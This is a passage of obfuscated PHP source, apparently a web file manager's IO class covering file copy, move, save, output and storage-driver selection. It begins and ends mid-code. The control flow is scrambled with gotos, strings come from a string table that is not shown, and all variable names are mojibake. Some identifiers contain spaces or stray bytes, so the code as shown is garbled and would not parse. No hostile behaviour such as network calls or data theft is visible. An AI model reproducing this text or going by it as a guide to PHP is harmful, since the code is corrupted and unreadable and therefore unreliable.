sqlEncode($CÛçÀŞÀï„) { $BğÎ©·Ü‹Á =& $_SERVER[›é¼±]; $f×Á­å¬¿’ = array(); foreach ($CÛçÀŞÀï„ as $fø¨‘‰‘ÖÑ) { if (is_array($fø¨‘‰‘ÖÑ)) { $fø¨‘‰‘ÖÑ = json_encode_force($fø¨‘‰‘ÖÑ); } $fø¨‘‰‘ÖÑ = addslashes($fø¨‘‰‘ÖÑ); $fø¨‘‰‘ÖÑ = str_replace(array($BğÎ©·Ü‹Á[1071], $BğÎ©·Ü‹Á[229]), array($BğÎ©·Ü‹Á[1072], $BğÎ©·Ü‹Á[1073]), $fø¨‘‰‘ÖÑ); $f×Á­å¬¿’[] = str_replace($BğÎ©·Ü‹Á[55], $BğÎ©·Ü‹Á[1074], $fø¨‘‰‘ÖÑ); } return $BğÎ©·Ü‹Á[55] . implode($BğÎ©·Ü‹Á[1075], $f×Á­å¬¿’) . $BğÎ©·Ü‹Á[55]; } private function sqlDecode($Fª¡¡¥‡À›, $B°®Œ¤ŸŒ) { $dÛ¼¿Ã¾õ =& $_SERVER[›é¼±]; $Fª¡¡¥‡À› = str_replace(array($dÛ¼¿Ã¾õ[1072], $dÛ¼¿Ã¾õ[1073]), array($dÛ¼¿Ã¾õ[1071], $dÛ¼¿Ã¾õ[229]), $Fª¡¡¥‡À›); if ($B°®Œ¤ŸŒ == $dÛ¼¿Ã¾õ[9]) { $Fª¡¡¥‡À› = stripslashes($Fª¡¡¥‡À›); } return $Fª¡¡¥‡À›; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($aİÉÜÚÚŞ¯, $dïÇõŠĞŒÖ) { goto c£‡ÔÙÄ¨‹; c£‡ÔÙÄ¨‹: $d¬ò‹Şè¡ù =& $_SERVER[›é¼±]; $bà›Ÿß†¥ = $dïÇõŠĞŒÖ; $GLOBALS[$d¬ò‹Şè¡ù[1076]] = $d¬ò‹Şè¡ù[1077] . $aİÉÜÚÚŞ¯; goto D—ä™ò§±; f½„…ÂÒÙ–: Hook::trigger($d¬ò‹Şè¡ù[1077] . $aİÉÜÚÚŞ¯ . $d¬ò‹Şè¡ù[1080], $bà›Ÿß†¥, $B¼±‡‰êËë); return $B¼±‡‰êËë; goto eƒÍ¦†¸Ü; D—ä™ò§±: Hook::trigger($d¬ò‹Şè¡ù[1077] . $aİÉÜÚÚŞ¯ . $d¬ò‹Şè¡ù[1078], $bà›Ÿß†¥); $aß­öŒµ© = self::driverMake($dïÇõŠĞŒÖ[0]); if (method_exists($aß­öŒµ©, $aİÉÜÚÚŞ¯)) { $B¼±‡‰êËë = @call_user_func_array(array($aß­öŒµ©, $aİÉÜÚÚŞ¯), $dïÇõŠĞŒÖ); } else { if (method_exists($aß­öŒµ©, $d¬ò‹Şè¡ù[1079])) { $B¼±‡‰êËë = @call_user_func_array(array($aß­öŒµ©, $aİÉÜÚÚŞ¯), $dïÇõŠĞŒÖ); } else { if (method_exists(self, $aİÉÜÚÚŞ¯)) { $B¼±‡‰êËë = @call_user_func_array(array(self, $aİÉÜÚÚŞ¯), $dïÇõŠĞŒÖ); } else { $B¼±‡‰êËë = call_user_func_array(array(parent, $aİÉÜÚÚŞ¯), $dïÇõŠĞŒÖ); } } } goto f½„…ÂÒÙ–; eƒÍ¦†¸Ü: } public static function init($b’¨šô¹Í) { return self::driverMake($b’¨šô¹Í); } public static function copy($EÁ™çÍÌè§, $d„’ñÇ›Òù, $fÈÉÓà§Ìß = false, $eËµè›”ä = false) { return self::copyMoveStart($EÁ™çÍÌè§, $d„’ñÇ›Òù, $fÈÉÓà§Ìß, $_SERVER[›é¼±][543], $eËµè›”ä); } public static function move($f÷ÈÔÁ¬…Ó, $Bğñ„™Õ£ù, $CÃÕÜ‹ìóº = false, $C½¼Š¼ùé = false) { return self::copyMoveStart($f÷ÈÔÁ¬…Ó, $Bğñ„™Õ£ù, $CÃÕÜ‹ìóº, $_SERVER[›é¼±][545], $C½¼Š¼ùé); } private static function copyMoveStart($dÊ„ù£É“, $EŒèšššàï, $fˆ™¿ñ°¿á, $fŠ¥Ï­, $c„ˆù±¦¤¹) { $Bù‹‚è±»ª =& $_SERVER[›é¼±]; $D½ªÌ…ÄŸ¹ = array($dÊ„ù£É“, $EŒèšššàï, $fˆ™¿ñ°¿á, $c„ˆù±¦¤¹); Hook::trigger($Bù‹‚è±»ª[1077] . $fŠ¥Ï­ . $Bù‹‚è±»ª[1078], $D½ªÌ…ÄŸ¹); $fšğŞÏß = self::copyMove($dÊ„ù£É“, $EŒèšššàï, $fˆ™¿ñ°¿á, $fŠ¥Ï­, $c„ˆù±¦¤¹); Hook::trigger($Bù‹‚è±»ª[1077] . $fŠ¥Ï­ . $Bù‹‚è±»ª[1080], $D½ªÌ…ÄŸ¹, $fšğŞÏß); return $fšğŞÏß; } public static function saveFile($BÔÜ£ßÖÊß, $A½ÖÌº£Äò, $dÁ–„Ã†¤Â = true) { goto cø¤ê“õ×ê; c‡´ù”³ã: if (!$dÁ–„Ã†¤Â && self::driverIsSame($a‚õõ¡œ§¨, $c±Å›àÒİÌ)) { $fÄõË„À‡¥ = !1; } $Eİ¾ôÓãÇƒ = self::copyFile($a‚õõ¡œ§¨, $BÔÜ£ßÖÊß, $c±Å›àÒİÌ, $E¶œ¦°â, $F…ˆÅêùÂ[$Cë†Î±§ñ[28]], $fÄõË„À‡¥); if ($CË¶˜ØŞ›) { $Eİ¾ôÓãÇƒ = $CË¶˜ØŞ›->getPathOuter($Eİ¾ôÓãÇƒ); } goto a®ÓäÒ™ ä; a®ÓäÒ™ ä: return $Eİ¾ôÓãÇƒ; goto E¨ÇÓµõğ; cø¤ê“õ×ê: $Cë†Î±§ñ =& $_SERVER[›é¼±]; $F…ˆÅêùÂ = self::info($A½ÖÌº£Äò); $a‚õõ¡œ§¨ = self::driverMake($BÔÜ£ßÖÊß); goto d™¶Õäˆõø; BÍğ™¾µÆ°: if ($a‚õõ¡œ§¨->pathParse[$Cë†Î±§ñ[1081]]) { $a‚õõ¡œ§¨ = self::driverMake($a‚õõ¡œ§¨->pathParse[$Cë†Î±§ñ[1081]]); } $E¶œ¦°â = $c±Å›àÒİÌ->pathFather($A½ÖÌº£Äò); $fÄõË„À‡¥ = !0; goto c‡´ù”³ã; d™¶Õäˆõø: $c±Å›àÒİÌ = self::driverMake($A½ÖÌº£Äò); $CË¶˜ØŞ› = !1; if ($c±Å›àÒİÌ->pathParse[$Cë†Î±§ñ[1081]]) { $CË¶˜ØŞ› = $c±Å›àÒİÌ; $c±Å›àÒİÌ = self::driverMake($c±Å›àÒİÌ->pathParse[$Cë†Î±§ñ[1081]]); } goto BÍğ™¾µÆ°; E¨ÇÓµõğ: } private static function copyMove($FùàÚŸë¯, $BÜİ‘ö“ª, $CË¹“¢²¨ò, $CâàÏñ°‘š, $C¾©§äÃË = false) { goto d²®’Ñ›Ø´; c‚šÓ‘Ñ¬ƒ: if ($eñ„ì‰ºà¬) { if ($CâàÏñ°‘š == $a¿ì…°ŠÙÙ[545] && !method_exists($EóÈ§Ô—´è, $a¿ì…°ŠÙÙ[1082]) && trim($BÜİ‘ö“ª, $a¿ì…°ŠÙÙ[8]) == trim($EóÈ§Ô—´è->pathFather($FùàÚŸë¯), $a¿ì…°ŠÙÙ[8])) { if ($BÔœ½ÄÛ¤ï->pathThis($FùàÚŸë¯) != $C¾©§äÃË && !$BÔœ½ÄÛ¤ï->isTypeObject()) { return $BÔœ½ÄÛ¤ï->rename($FùàÚŸë¯, $C¾©§äÃË); } return $EóÈ§Ô—´è->getPathOuter($FùàÚŸë¯); } if (method_exists($EóÈ§Ô—´è, $CâàÏñ°‘š)) { return $EóÈ§Ô—´è->{$CâàÏñ°‘š}($FùàÚŸë¯, $BÜİ‘ö“ª, $CË¹“¢²¨ò); } } $Aƒœ¹é’ = $BÔœ½ÄÛ¤ï->isFile($FùàÚŸë¯); if (!$Aƒœ¹é’ && $EóÈ§Ô—´è->getType() == $a¿ì…°ŠÙÙ[753] && $BÔœ½ÄÛ¤ï->getType() == $a¿ì…°ŠÙÙ[106]) { $Eˆöª·Æ° = $EóÈ§Ô—´è->copyFolderFromIO($BÔœ½ÄÛ¤ï, $FùàÚŸë¯, $BÜİ‘ö“ª, $CË¹“¢²¨ò, $Eİ¤•Ã»È³, $C¾©§äÃË); } else { $Eˆöª·Æ° = self::copyPath($BÔœ½ÄÛ¤ï, $FùàÚŸë¯, $EóÈ§Ô—´è, $BÜİ‘ö“ª, $CË¹“¢²¨ò, $Eİ¤•Ã»È³, $Aƒœ¹é’, $C¾©§äÃË); } goto b¶æöğÑ£ë; b¶æöğÑ£ë: if ($Eˆöª·Æ° && $Eİ¤•Ã»È³) { $BÔœ½ÄÛ¤ï->remove($FùàÚŸë¯); } if ($e‚’™¶í›ø) { $Eˆöª·Æ° = $e‚’™¶í›ø->getPathOuter($Eˆöª·Æ°); } return $Eˆöª·Æ°; goto F´¶¥É…Ö; d²®’Ñ›Ø´: $a¿ì…°ŠÙÙ =& $_SERVER[›é¼±]; if (!$FùàÚŸë¯ || $FùàÚŸë¯ == $a¿ì…°ŠÙÙ[8] || !$BÜİ‘ö“ª) { return !1; } ignore_timeout(); goto FÑÑ£ĞÉ‰Ï; FÑÑ£ĞÉ‰Ï: $BÔœ½ÄÛ¤ï = self::driverMake($FùàÚŸë¯); $EóÈ§Ô—´è = self::driverMake($BÜİ‘ö“ª); $Eİ¤•Ã»È³ = $CâàÏñ°‘š == $a¿ì…°ŠÙÙ[545]; goto dèò÷·†Ü; dèò÷·†Ü: $e‚’™¶í›ø = !1; if ($EóÈ§Ô—´è->pathParse[$a¿ì…°ŠÙÙ[1081]]) { $e‚’™¶í›ø = $EóÈ§Ô—´è; $EóÈ§Ô—´è = self::driverMake($EóÈ§Ô—´è->pathParse[$a¿ì…°ŠÙÙ[1081]]); } if ($BÔœ½ÄÛ¤ï->pathParse[$a¿ì…°ŠÙÙ[1081]]) { $BÔœ½ÄÛ¤ï = self::driverMake($BÔœ½ÄÛ¤ï->pathParse[$a¿ì…°ŠÙÙ[1081]]); } goto E†Å¤ˆ™; E†Å¤ˆ™: self::check($BÔœ½ÄÛ¤ï, $FùàÚŸë¯, $EóÈ§Ô—´è, $BÜİ‘ö“ª); Hook::trigger($a¿ì…°ŠÙÙ[73], $BÔœ½ÄÛ¤ï, $FùàÚŸë¯, $EóÈ§Ô—´è, $BÜİ‘ö“ª); $eñ„ì‰ºà¬ = self::driverIsSame($BÔœ½ÄÛ¤ï, $EóÈ§Ô—´è); goto c‚šÓ‘Ñ¬ƒ; F´¶¥É…Ö: } private static function check($A¡ëÅÇï—„, $Fñ»§Ì³¹, $BÎøùöÑ¯•, &$d“©Ù‚‚°ˆ) { $e®†¢ãô =& $_SERVER[›é¼±]; if (self::driverIsSame($A¡ëÅÇï—„, $BÎøùöÑ¯•) && $A¡ëÅÇï—„->isFolder($Fñ»§Ì³¹) && $A¡ëÅÇï—„->isParentOf($Fñ»§Ì³¹, $d“©Ù‚‚°ˆ)) { show_json(LNG($e®†¢ãô[1083]), !1); } if (!$A¡ëÅÇï—„->exist($Fñ»§Ì³¹)) { show_json(LNG($e®†¢ãô[105]), !1); } } private static function copyPath($cìØŸ¡¨’, $A¤÷¼¾Ûëë, $BÍÁÇå­—, $b™øø±Ï¼‘, $F©«í…Âî¯, $d¼ÊÎœß’, $b¡‰”ğ­æ, $e¥¨¦Äœ„¥ = false) { goto eİ­Ù…µ­; eİ­Ù…µ­: $Eä“ÜÒ‰¢ =& $_SERVER[›é¼±]; $E²Ë±ìç¯¶ = empty($e¥¨¦Äœ„¥) && $e¥¨¦Äœ„¥ !== $Eä“ÜÒ‰¢[191] ? $cìØŸ¡¨’->pathThis($A¤÷¼¾Ûëë) : $e¥¨¦Äœ„¥; if ($F©«í…Âî¯) { $eÍÁŒ³ßî = $BÍÁÇå­—->fileNameExist($b™øø±Ï¼‘, $E²Ë±ìç¯¶); $E²Ë±ìç¯¶ = $BÍÁÇå­—->fileNameAuto($b™øø±Ï¼‘, $E²Ë±ìç¯¶, $F©«í…Âî¯, !$b¡‰”ğ­æ); $F©«í…Âî¯ = $eÍÁŒ³ßî ? $F©«í…Âî¯ : !1; } goto eİ¢ÃøÁ¢ù; eİ¢ÃøÁ¢ù: if ($b¡‰”ğ­æ) { return self::copyFile($cìØŸ¡¨’, $A¤÷¼¾Ûëë, $BÍÁÇå­—, $b™øø±Ï¼‘, $E²Ë±ìç¯¶, $d¼ÊÎœß’); } if ($F©«í…Âî¯ == REPEAT_RENAME_FOLDER) { $F©«í…Âî¯ = !1; } $c©é›ÁÈ = rtrim($b™øø±Ï¼‘, $Eä“ÜÒ‰¢[8]) . $Eä“ÜÒ‰¢[8] . $E²Ë±ìç¯¶; goto CÈ›÷‘ğÀ²; aÕÍšÛ’ïÅ: $Dˆö¡‰…Õ = is_array($Dˆö¡‰…Õ) ? $Dˆö¡‰…Õ : array($Eä“ÜÒ‰¢[74] => array(), $Eä“ÜÒ‰¢[75] => array()); $eàÌ´›ñ¯ = array_merge($Dˆö¡‰…Õ[$Eä“ÜÒ‰¢[74]], $Dˆö¡‰…Õ[$Eä“ÜÒ‰¢[75]]); foreach ($eàÌ´›ñ¯ as $f×„™è«‡) { $D¬©Æ¦‹ˆ† = $f×„™è«‡[$Eä“ÜÒ‰¢[29]] == $Eä“ÜÒ‰¢[193]; $A¤÷¼¾Ûëë = $cìØŸ¡¨’->getPathInner($f×„™è«‡[$Eä“ÜÒ‰¢[76]]); $fÑÀ”´öõ¬ = self::copyPath($cìØŸ¡¨’, $A¤÷¼¾Ûëë, $BÍÁÇå­—, $b™øø±Ï¼‘, $F©«í…Âî¯, $d¼ÊÎœß’, $D¬©Æ¦‹ˆ†); if (!$fÑÀ”´öõ¬) { IO::errorTips($Eä“ÜÒ‰¢[1084] . $A¤÷¼¾Ûëë . $Eä“ÜÒ‰¢[67] . $b™øø±Ï¼‘); } } goto B£ñèŠ¡‹Ü; B£ñèŠ¡‹Ü: self::copyMoveKeepInfo($cìØŸ¡¨’, $A¤÷¼¾Ûëë, $eä×ÌÃÉï¡); return $eä×ÌÃÉï¡; goto fÑÂ¢ô•Ÿ„; CÈ›÷‘ğÀ²: $eä×ÌÃÉï¡ = $BÍÁÇå­—->mkdir($BÍÁÇå­—->getPath($c©é›ÁÈ)); $b™øø±Ï¼‘ = $BÍÁÇå­—->getPathInner($eä×ÌÃÉï¡); $Dˆö¡‰…Õ = $cìØŸ¡¨’->listPath($A¤÷¼¾Ûëë, !0); goto aÕÍšÛ’ïÅ; fÑÂ¢ô•Ÿ„: } private static function copyFile($bË¿Æ‚‹, $C»ÊÔ©Ïå’, $FœóÎÛ·£«, $Aµ ­³’œ­, $cîçïƒËÔ­, $bÓÇàÓƒ‘‘) { goto FÕ÷ËĞÄîŠ; B¡™æÕ±ÉÇ: Hook::trigger($e†Ôô‘¦À[1086], $bË¿Æ‚‹, $C»ÊÔ©Ïå’, $FœóÎÛ·£«, $Aµ ­³’œ­, $cîçïƒËÔ­, $AÚ‡¨îƒñ›); if (self::driverIsSame($bË¿Æ‚‹, $FœóÎÛ·£«)) { if ($bÓÇàÓƒ‘‘) { $F…Ó™´‘ø = $FœóÎÛ·£«->moveFile($C»ÊÔ©Ïå’, $Aµ ­³’œ­); } else { $F…Ó™´‘ø = $FœóÎÛ·£«->copyFile($C»ÊÔ©Ïå’, $Aµ ­³’œ­); } Hook::trigger($e†Ôô‘¦À[1087], $bË¿Æ‚‹, $C»ÊÔ©Ïå’, $FœóÎÛ·£«, $Aµ ­³’œ­, $cîçïƒËÔ­, $F…Ó™´‘ø); self::copyMoveKeepInfo($bË¿Æ‚‹, $C»ÊÔ©Ïå’, $F…Ó™´‘ø); return $F…Ó™´‘ø; } $CöÌî±¯ƒ = TEMP_FILES; goto Cò©Óà”—¤; Cò©Óà”—¤: if ($GLOBALS[$e†Ôô‘¦À[6]][$e†Ôô‘¦À[88]][$e†Ôô‘¦À[797]]) { $CöÌî±¯ƒ = $GLOBALS[$e†Ôô‘¦À[6]][$e†Ôô‘¦À[88]][$e†Ôô‘¦À[797]]; } $bÓÇàÓƒ‘‘ = !0; $C££åğÍßê = $CöÌî±¯ƒ; goto DˆğÀÍÔé¯; EªğÛ®º: return $F…Ó™´‘ø; goto b‰ò£êÜ; CÓÒ¨“Ø±: self::remove($Cîœ’ƒòÎ¡); Hook::trigger($e†Ôô‘¦À[1087], $bË¿Æ‚‹, $C»ÊÔ©Ïå’, $FœóÎÛ·£«, $Aµ ­³’œ­, $cîçïƒËÔ­, $F…Ó™´‘ø); self::copyMoveKeepInfo($bË¿Æ‚‹, $C»ÊÔ©Ïå’, $F…Ó™´‘ø); goto EªğÛ®º; FÕ÷ËĞÄîŠ: $e†Ôô‘¦À =& $_SERVER[›é¼±]; $Aµ ­³’œ­ = $FœóÎÛ·£«->getPath(rtrim($Aµ ­³’œ­, $e†Ôô‘¦À[8]) . $e†Ôô‘¦À[8] . $cîçïƒËÔ­); $AÚ‡¨îƒñ› = $e†Ôô‘¦À[1085] . time() . rand_string(5); goto B¡™æÕ±ÉÇ; aÇ¢ÂìäÏ: $EÉ¸…Áìïœ = $bË¿Æ‚‹->download($C»ÊÔ©Ïå’, $EÉ¸…Áìïœ); $EÉ¸…Áìïœ = $bË¿Æ‚‹->iconvApp($EÉ¸…Áìïœ); $F…Ó™´‘ø = $FœóÎÛ·£«->upload($Aµ ­³’œ­, $EÉ¸…Áìïœ, $bÓÇàÓƒ‘‘); goto CÓÒ¨“Ø±; DˆğÀÍÔé¯: mk_dir($C££åğÍßê); $EÉ¸…Áìïœ = $C££åğÍßê . $AÚ‡¨îƒñ›; $Cîœ’ƒòÎ¡ = $EÉ¸…Áìïœ; goto aÇ¢ÂìäÏ; b‰ò£êÜ: } private static function copyMoveKeepInfo($aòòƒôƒ»˜, $f¨ŒÅª—¹Æ, $B¹©÷ìáËÀ) { if (!$B¹©÷ìáËÀ) { return; } $Aì»àÍ÷ = $aòòƒôƒ»˜->info($f¨ŒÅª—¹Æ); if (!is_array($Aì»àÍ÷)) { return; } IO::setModifyTime($B¹©÷ìáËÀ, $Aì»àÍ÷[$_SERVER[›é¼±][84]]); } public static function pathFather($aØÀ’ù˜Şª) { $Cäñ”§Ã§ô = IO::init($aØÀ’ù˜Şª); $Eï¹’‚ïÑ = $Cäñ”§Ã§ô->pathFather($Cäñ”§Ã§ô->path); return $Cäñ”§Ã§ô->getPathOuter($Eï¹’‚ïÑ); } public static function fileOut($Aî‰¥Ã‘…, $e®¿öì©ªµ = false, $c¹‘ÆÓ’ò = false, $C‚ˆÀÊÄ•Ò = '') { $BİÄ²†»™î = self::driverMake($Aî‰¥Ã‘…); if ($BİÄ²†»™î->isFileOutServer()) { return $BİÄ²†»™î->fileOutServer($Aî‰¥Ã‘…, $e®¿öì©ªµ, $c¹‘ÆÓ’ò, $C‚ˆÀÊÄ•Ò); } return $BİÄ²†»™î->fileOut($Aî‰¥Ã‘…, $e®¿öì©ªµ, $c¹‘ÆÓ’ò, $C‚ˆÀÊÄ•Ò); } public static function fileOutImage($f¥Æ÷âÉ‹õ, $eà—ÈºÔÌ¶ = 250) { $D¥á¬Ëùƒ¤ = array(250, 600, 1200, 2000, 3000, 5000); for ($cğç‘¤îÌÔ = 0; $cğç‘¤îÌÔ < count($D¥á¬Ëùƒ¤); $cğç‘¤îÌÔ++) { if ($cğç‘¤îÌÔ == 0 && $eà—ÈºÔÌ¶ <= $D¥á¬Ëùƒ¤[$cğç‘¤îÌÔ]) { $eà—ÈºÔÌ¶ = $D¥á¬Ëùƒ¤[$cğç‘¤îÌÔ]; break; } else { if ($eà—ÈºÔÌ¶ > $D¥á¬Ëùƒ¤[$cğç‘¤îÌÔ - 1] && $eà—ÈºÔÌ¶ <= $D¥á¬Ëùƒ¤[$cğç‘¤îÌÔ]) { $eà—ÈºÔÌ¶ = $D¥á¬Ëùƒ¤[$cğç‘¤îÌÔ]; break; } else { if ($cğç‘¤îÌÔ == count($D¥á¬Ëùƒ¤) - 1 && $eà—ÈºÔÌ¶ > $D¥á¬Ëùƒ¤[$cğç‘¤îÌÔ]) { $eà—ÈºÔÌ¶ = $D¥á¬Ëùƒ¤[$cğç‘¤îÌÔ]; break; } } } } $dÚì…Ó­˜ø = self::driverMake($f¥Æ÷âÉ‹õ); if ($dÚì…Ó­˜ø->isFileOutServer()) { return $dÚì…Ó­˜ø->fileOutImageServer($f¥Æ÷âÉ‹õ, $eà—ÈºÔÌ¶); } return $dÚì…Ó­˜ø->fileOutImage($f¥Æ÷âÉ‹õ, $eà—ÈºÔÌ¶); } private static function driverIsSame($BÙ¯§Æ ğî, $D İ­´ä¹Ğ) { goto D¯Á•„ó‹ ; D¯Á•„ó‹ : $C¿‡‡Òâ =& $_SERVER[›é¼±]; $f„ôì®¥ä = $BÙ¯§Æ ğî->getType(); $E•ŠŠ‹çó¡ = $D İ­´ä¹Ğ->getType(); goto a‰å¶Ï„˜•; d®¥Å‘“ á: if ($BÙ¯§Æ ğî->pathDriver == $D İ­´ä¹Ğ->pathDriver) { return !0; } return !1; goto b ÉŒ†©ã; a‰å¶Ï„˜•: if ($f„ôì®¥ä != $E•ŠŠ‹çó¡) { return !1; } if ($f„ôì®¥ä == $C¿‡‡Òâ[753]) { return !0; } if ($f„ôì®¥ä == $C¿‡‡Òâ[106]) { return !0; } goto d®¥Å‘“ á; b ÉŒ†©ã: } public static function copyUpdate($Bã¿›…à§, $aœ»›í¬Ÿ®) { goto b²å”ªÕ¢; b²å”ªÕ¢: $CØ–×Õ²â  =& $_SERVER[›é¼±]; if (!IO::exist($Bã¿›…à§)) { return !1; } if (!IO::exist($aœ»›í¬Ÿ®)) { IO::mkdir($aœ»›í¬Ÿ®); } goto aİä¨ãÏù; DçÒÊ¨Óà: Hook::trigger($CØ–×Õ²â [1091], $Bã¿›…à§, $aœ»›í¬Ÿ®, $EŸ›ÆäëòØ); foreach ($FßÔ°†º´ as $C×¹áÈ ) { IO::mkdir($C×¹áÈ ); } foreach ($eÛ‘Ñø›æ³ as $C×¹áÈ ) { IO::copy($C×¹áÈ [$CØ–×Õ²â [1088]], $C×¹áÈ [$CØ–×Õ²â [1089]], REPEAT_REPLACE); } goto c‚ùÌ¬åî¤; aİä¨ãÏù: $d†¾ğ»«æì = self::_listAll($Bã¿›…à§); $d¤ã†ŠéÛˆ = self::_listAll($aœ»›í¬Ÿ®); $eÛ‘Ñø›æ³ = array(); goto E¡˜òá–ñÁ; E¡˜òá–ñÁ: $FßÔ°†º´ = array(); foreach ($d†¾ğ»«æì as $e³¬å‡Àì => $C×¹áÈ ) { if (isset($d¤ã†ŠéÛˆ[$e³¬å‡Àì])) { if ($C×¹áÈ [$CØ–×Õ²â [77]] == 1) { continue; } if ($d¤ã†ŠéÛˆ[$e³¬å‡Àì][$CØ–×Õ²â [78]] == $C×¹áÈ [$CØ–×Õ²â [78]]) { continue; } } if ($C×¹áÈ [$CØ–×Õ²â [77]] == 1) { $FßÔ°†º´[] = $aœ»›í¬Ÿ® . $CØ–×Õ²â [8] . $e³¬å‡Àì; continue; } $aÏ†Ù©İÒÚ = strstr(trim($e³¬å‡Àì, $CØ–×Õ²â [8]), $CØ–×Õ²â [8]) ? get_path_father($e³¬å‡Àì) : $CØ–×Õ²â [33]; $eÛ‘Ñø›æ³[] = array($CØ–×Õ²â [1088] => $C×¹áÈ [$CØ–×Õ²â [76]], $CØ–×Õ²â [1089] => rtrim($aœ»›í¬Ÿ®, $CØ–×Õ²â [8]) . $CØ–×Õ²â [8] . $aÏ†Ù©İÒÚ, $CØ–×Õ²â [1090] => $C×¹áÈ ); } $EŸ›ÆäëòØ = array($CØ–×Õ²â [193] => $eÛ‘Ñø›æ³, $CØ–×Õ²â [77] => $FßÔ°†º´); goto DçÒÊ¨Óà; c‚ùÌ¬åî¤: } private static function _listAll($Aø›ïøª) { $e…ÃœâµÌ» =& $_SERVER[›é¼±]; $Aø›ïøª = KodIO::clear($Aø›ïøª); $eÙÓ‹¾Îõ› = IO::listAll($Aø›ïøª); foreach ($eÙÓ‹¾Îõ› as &$bÂ²ï·ôÅ) { $bŒ¡ÙÊõÜŠ = substr($bÂ²ï·ôÅ[$e…ÃœâµÌ»[76]], strlen($Aø›ïøª)); $bÂ²ï·ôÅ[$e…ÃœâµÌ»[1092]] = trim($bŒ¡ÙÊõÜŠ, $e…ÃœâµÌ»[8]); } unset($bÂ²ï·ôÅ); return array_to_keyvalue($eÙÓ‹¾Îõ›, $e…ÃœâµÌ»[1092]); } public static function fileSubstr($f˜¹µ‡æä¯, $a£ÑİÑÓ‘¸, $C½¨Öã­÷Ç = false) { goto d­öÇ«ÜõØ; d­öÇ«ÜõØ: $C¸‘š§ ¿‘ =& $_SERVER[›é¼±]; $BªÈ–Î·»è = self::driverMake($f˜¹µ‡æä¯); $DğóšÍØ¶ƒ = $BªÈ–Î·»è->size($f˜¹µ‡æä¯); goto bÆó©½ÉÙœ; fÑ‘âÇÀ…²: if (!$dµ¤¡»¨’ && $C½¨Öã­÷Ç && isset($GLOBALS[$C¸‘š§ ¿‘[1095]])) { throw new Exception($GLOBALS[$C¸‘š§ ¿‘[1095]][$C¸‘š§ ¿‘[1096]]); } return $dµ¤¡»¨’; goto FÒ™®ÀáÉÜ; BŒÚ™™¿Öß: if ($C½¨Öã­÷Ç === !1) { $C½¨Öã­÷Ç = $DğóšÍØ¶ƒ - $a£ÑİÑÓ‘¸; } if ($a£ÑİÑÓ‘¸ + $C½¨Öã­÷Ç > $DğóšÍØ¶ƒ) { $C½¨Öã­÷Ç = $DğóšÍØ¶ƒ - $a£ÑİÑÓ‘¸; } if (!$DğóšÍØ¶ƒ && $BªÈ–Î·»è->getType() == $C¸‘š§ ¿‘[106] && !$BªÈ–Î·»è->exist($f˜¹µ‡æä¯)) { throw new Exception($C¸‘š§ ¿‘[1093] . LNG($C¸‘š§ ¿‘[1094]) . $C¸‘š§ ¿‘[959] . get_path_this($f˜¹µ‡æä¯) . $C¸‘š§ ¿‘[33]); } goto dÉ¹õÚº; dÉ¹õÚº: if ($C½¨Öã­÷Ç <= 0) { return $C¸‘š§ ¿‘[33]; } if ($a£ÑİÑÓ‘¸ < 0 || $a£ÑİÑÓ‘¸ >= $DğóšÍØ¶ƒ || $C½¨Öã­÷Ç > 1024 * 1024 * 10) { throw new Exception("\146\x69\154\x65\122\145\141\x64\x20\145\162\162\157\x72\41\x20\163\164\x61\162\x74\x3d{$a£ÑİÑÓ‘¸}\x3b\154\x65\156\147\164\x68\75{$C½¨Öã­÷Ç}\x3b\40\163\x69\x7a\145\x3d{$DğóšÍØ¶ƒ}\73"); } $dµ¤¡»¨’ = $BªÈ–Î·»è->fileSubstr($f˜¹µ‡æä¯, $a£ÑİÑÓ‘¸, $C½¨Öã­÷Ç); goto fÑ‘âÇÀ…²; bÆó©½ÉÙœ: $bÛ‹Áˆ‹·ò = $a£ÑİÑÓ‘¸; $cï©µñ®˜¢ = $C½¨Öã­÷Ç; if ($a£ÑİÑÓ‘¸ < 0) { $a£ÑİÑÓ‘¸ = $DğóšÍØ¶ƒ + $a£ÑİÑÓ‘¸; } goto BŒÚ™™¿Öß; FÒ™®ÀáÉÜ: } private static function driverMake(&$d–ºÙÁËˆã) { goto aåÑĞ‰· Í; aåÑĞ‰· Í: $B¥óà­¡¦ø =& $_SERVER[›é¼±]; $d‰«¿¥ƒÂÂ = KodIO::parse($d–ºÙÁËˆã); if (!self::$driverListSystem) { $A»ÆÒ¤®°± = Model($B¥óà­¡¦ø[762])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($A»ÆÒ¤®°±, $B¥óà­¡¦ø[395]); } goto eÃ‹ïÍö; A”æËŞÍ: return $F—¿É©”ô; goto cÍö·¨‡ÒÆ; eÃ‹ïÍö: if ($d‰«¿¥ƒÂÂ[$B¥óà­¡¦ø[29]] == KodIO::KOD_IO && !self::$driverListSystem[$d‰«¿¥ƒÂÂ[$B¥óà­¡¦ø[395]]]) { return !1; } $d–ºÙÁËˆã = $d‰«¿¥ƒÂÂ[$B¥óà­¡¦ø[1097]]; $F—¿É©”ô = self::driverGet($d‰«¿¥ƒÂÂ, $d–ºÙÁËˆã); goto A”æËŞÍ; cÍö·¨‡ÒÆ: } private static function driverGet($B„™í¡‹õ, &$fÚÁ¬³’áŸ) { goto F˜¿¯’ÇÏ; dÜĞÕ‹”Ù: switch ($B„™í¡‹õ[$B´‡ÒÈ•››[29]]) { case KodIO::KOD_IO: $cßÂğáĞœø = self::$driverListSystem[$aÄˆ·ŞàÙÄ]; break; case KodIO::KOD_SOURCE: $fÚÁ¬³’áŸ = $aÄˆ·ŞàÙÄ . $fÚÁ¬³’áŸ; $cßÂğáĞœø = array($B´‡ÒÈ•››[1099] => $B´‡ÒÈ•››[1100], $B´‡ÒÈ•››[6] => $B„™í¡‹õ); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $a³Øƒ´¶¥ê = $GLOBALS[$B´‡ÒÈ•››[1101]]; self::$driverListUser = array_to_keyvalue($a³Øƒ´¶¥ê, $B´‡ÒÈ•››[395]); } $cßÂğáĞœø = self::$driverListUser[$aÄˆ·ŞàÙÄ]; break; case KodIO::KOD_SHARE_LINK: $cßÂğáĞœø = array($B´‡ÒÈ•››[1099] => $B´‡ÒÈ•››[1102], $B´‡ÒÈ•››[6] => $B„™í¡‹õ); $C‚”¦ç› = Action($B´‡ÒÈ•››[1103])->sharePathInfo($B„™í¡‹õ[$B´‡ÒÈ•››[76]]); $fÚÁ¬³’áŸ = $C‚”¦ç›[$B´‡ÒÈ•››[397]]; if 